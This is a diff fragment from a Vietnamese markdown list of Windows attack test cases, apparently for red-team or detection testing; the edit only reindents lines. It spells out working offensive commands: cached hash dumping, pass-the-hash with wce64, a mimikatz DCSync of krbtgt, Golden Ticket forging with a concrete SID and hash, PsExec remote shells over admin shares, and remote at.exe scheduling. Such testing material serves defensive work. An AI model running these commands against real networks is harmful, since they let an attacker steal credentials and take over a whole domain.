@@ -109,14 +109,14 @@ quarkspwdump.exe --dump-hash-domain-cached
 * Ví dụ: `.\wce64.exe -s sv:WINSRV2008:00000000000000000000000000000000:130B0F15BFF820D1DFDE026CD3554719`
 
 ## Test case 11: Golden Ticket
-* Command: 
- * Vào mimikatz: `.\mimikatz.exe`
- * Lấy NTLM của Krbtgt: `lsadump::dcsync /domain:dc01.local /user:krbtgt`
- * Tiến hành tạo ticket và pass-the-ticket này vào current logon session: `kerberos::golden /domain:winsrv2008.local /sid:S-1-5-21-4220747943-3152432350-320651364 /rc4:e7111664b88b4b058010fde4aa37fec1 /id:500 /user:FakeAdmin /ptt`
- * Có thể sử dụng misc::cmd để mở một cmd mới hoặc exit rồi sử dụng cmd hiện tại. Pass-the-hash:
-  * `net use O: \\winsrv\c$`
-  * `pushd \\winsrv\c$`
-  * `.\PsExec64.exe \\winsrv cmd`
+* Command:
+  * Vào mimikatz: `.\mimikatz.exe`
+  * Lấy NTLM của Krbtgt: `lsadump::dcsync /domain:dc01.local /user:krbtgt`
+  * Tiến hành tạo ticket và pass-the-ticket này vào current logon session: `kerberos::golden /domain:winsrv2008.local /sid:S-1-5-21-4220747943-3152432350-320651364 /rc4:e7111664b88b4b058010fde4aa37fec1 /id:500 /user:FakeAdmin /ptt`
+  * Có thể sử dụng misc::cmd để mở một cmd mới hoặc exit rồi sử dụng cmd hiện tại. Pass-the-hash:
+   * `net use O: \\winsrv\c$`
+   * `pushd \\winsrv\c$`
+   * `.\PsExec64.exe \\winsrv cmd`
 
 ## Test case 12: AT Command
 * Command: `at.exe \\192.168.255.100 10:00 cmd /c ping 8.8.8.8`
